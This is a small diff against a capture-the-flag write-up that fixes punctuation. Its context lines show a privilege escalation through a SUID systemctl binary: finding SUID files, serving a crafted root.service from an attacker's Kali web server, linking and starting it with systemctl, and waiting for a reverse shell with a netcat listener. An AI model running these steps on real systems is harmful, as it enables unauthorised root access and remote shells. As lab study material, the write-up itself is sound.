@@ -133,7 +133,7 @@ machine:~$ find / -perm -u=s -type f | grep -v "Permission denied"
 > *Answer:* /bin/systemctl
 
 ### Become root and get the last flag (/root/root.txt)
-Create a file called *root.service* inside kali apache2 server
+Create a file called *root.service* inside kali apache2 server.
 ```
 ┌──(root💀kali)-[~]
 └─# cat > /var/www/html/root.service
@@ -160,7 +160,7 @@ Created symlink from /etc/systemd/system/root.service to /tmp/root.service.
 machine:~$ /bin/systemctl start root.service
 ```
 
-Listen to incoming connections using netcat
+Listen to incoming connections using netcat.
 ```
 ┌──(root💀kali)-[~]
 └─# nc -lvnp 8888
